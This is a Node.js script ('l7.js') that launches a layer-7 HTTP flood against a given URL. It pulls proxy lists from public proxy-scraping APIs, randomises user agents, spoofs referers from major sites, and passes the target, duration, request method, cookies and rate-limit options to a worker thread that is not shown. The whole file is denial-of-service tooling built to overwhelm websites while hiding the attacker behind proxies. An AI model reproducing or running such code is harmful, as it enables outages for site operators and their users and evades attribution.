process.setMaxListeners(0);
var postdata = process.argv[7];
var refer = process.argv[10];
const fs = require("fs");
const cluster = require('cluster');
    const requestproxy = require('sync-request');
    const random_useragent = require('random-useragent');

    process.on('uncaughtException', function (e) {
    console.warn(e);
});

process.on('unhandledRejection', function (e) {
    console.warn(e);
});


if (process.argv.length <= 2) {
    console.log("Usage: node l7.js <URL> <TIME> <MODE(request,websocket,proxy)> <REQUEST-METHOD(GET-POST-HEAD-RAND)> <RATE LIMIT(true-false)> <COOKIES(true-false)>");
    process.exit(-1);
}
    
    //proxys uri
let res_proxies = requestproxy('GET', 'https://api.proxyscrape.com/?request=displayproxies&proxytype=http&https&socks4&socks5','https://www.proxy-list.download/api/v1/get?type=http&https&socks4&socks5');
//let res_proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n');
const {
    Worker
} = require('worker_threads');
new Worker('./request.js', {
    workerData: {
        target: process.argv[2].replace(/~/g, '&'),
        proxies: [...new Set(res_proxies.getBody().toString().match(/.+/g))],
        //proxies: [...new Set(fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
        userAgents: [...new Set(random_useragent.getRandom())],
        referers: ["https://google.com", "https://youtube.com", "https://bing.com", "https://yahoo.com", "https://facebook.com", "https://gmail.com", "https://baidu.com", "https://qq.com", "https://reddit.com"],
        duration: process.argv[3] * 1e3,
        opt: {
            method: process.argv[6] || "GET",
            body: postdata.replace(/~/g, '&') !== 'false' ? postdata.replace(/~/g, '&') : false,
            ratelimit: process.argv[8] == 'false' ? false : true,
            cookie: process.argv[9] !== 'false' ? process.argv[9] : false,
            refer: refer !== 'false' ? refer : ""
        },
        mode: process.argv[4]
    }}).on('exit', code => {
    if (code) {
        switch (code) {
            case '6':

                break;
        }
    }
});

setTimeout(() => {
        process.exit(1)
}, process.argv[3] * 1000)
